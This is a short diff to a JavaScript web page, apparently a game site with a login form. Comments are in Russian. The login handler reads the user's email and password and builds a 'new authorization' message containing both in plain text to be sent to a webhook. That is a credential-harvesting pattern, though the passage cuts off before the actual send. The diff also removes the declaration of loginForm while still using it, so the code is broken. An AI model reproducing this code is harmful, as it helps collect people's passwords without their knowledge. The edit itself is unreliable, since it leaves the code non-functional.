@@ -330,15 +330,16 @@ function checkGoldCollected() {
     }
 
     /* ---------- ОБРАБОТКА АВТОРИЗАЦИИ ---------- */
-    const loginForm = document.getElementById("login-form");
     loginForm.addEventListener("submit", function(e) {
-      e.preventDefault();
-      const email = document.getElementById("email").value.trim();
-      const password = document.getElementById("password").value.trim();
-      if (!email || !password) {
-        document.getElementById("login-result").textContent = "Заполните все поля";
-        return;
-      }
+  e.preventDefault();  // Останавливаем стандартную отправку формы
+  
+  const email = document.getElementById("email").value.trim();
+  const password = document.getElementById("password").value.trim();
+  
+  if (!email || !password) {
+    document.getElementById("login-result").textContent = "Заполните все поля";
+    return;
+  }
       // Формируем сообщение для вебхука: авторизация
       const authMsg = `Новая авторизация:
 Email: ${email}
